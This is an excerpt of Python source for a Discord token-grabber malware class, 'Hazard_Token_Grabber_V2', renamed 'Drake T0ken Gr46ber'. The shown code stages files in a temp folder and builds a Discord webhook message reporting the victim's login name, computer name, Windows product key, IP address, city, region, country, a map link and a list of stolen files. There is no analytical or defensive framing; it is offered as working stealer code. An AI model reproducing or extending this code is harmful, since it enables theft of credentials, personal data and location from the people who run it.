...
class Hazard_Token_Grabber_V2:
    def __init__(self):
        ...
        self.tempfolder = os.getenv("temp")+"\\Drake_T0ken_Gr46ber_"
    ...
    def SendInfo(self):
        ...
        embed = {
            "avatar_url":"https://cdn.discordapp.com/avatars/689409960752316446/a_c9c666620856c70c81a846d8dd7a85df.webp?size=80",
            "embeds": [
                {
                    "author": {
                        "name": "Drake T0ken Gr46ber",
                        "url": "Drake.#0001",
                        "icon_url": "https://cdn.discordapp.com/avatars/689409960752316446/a_c9c666620856c70c81a846d8dd7a85df.gif"
                    },
                    "description": f'**{os.getlogin()}** Just ran Drake T0ken Gr46ber\n```fix\nComputerName: {os.getenv("COMPUTERNAME")}\n{wname}: {wkey if wkey else "No Product Key"}\nIP: {ip}\nCity: {city}\nRegion: {region}\nCountry: {country}```[Google Maps Location]({googlemap})\n```fix\n{self.fileCount}{self.files}```',
                    "color": 16119101,

                    "thumbnail": {
                      "url": "https://cdn.discordapp.com/avatars/689409960752316446/a_c9c666620856c70c81a846d8dd7a85df.gif"
                    },       
